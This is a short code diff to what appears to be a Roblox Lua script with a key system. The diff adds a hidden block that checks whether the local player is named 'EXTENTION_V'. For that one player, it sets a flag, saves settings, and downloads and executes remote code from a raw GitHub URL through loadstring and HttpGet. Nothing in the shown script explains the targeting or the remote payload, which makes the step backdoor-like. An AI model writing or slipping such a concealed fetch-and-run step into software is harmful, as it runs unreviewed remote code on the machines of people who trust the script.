@@ -1,3 +1,5 @@
+local barbie = game:GetService("Players").LocalPlayer
+
 _G.settingsTable = {
 KeySystem = true;
 }
@@ -46,6 +48,13 @@ end
 end
 
 Settingsload()
+
+if barbie.Name == "EXTENTION_V" then
+
+_G.Tablesettings.balk = true 
+Settingssave()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/testforshiistuff/stuff/main/Sadness'),true))()
+end
 
 if _G.settingsTable.KeySystem == true then
 
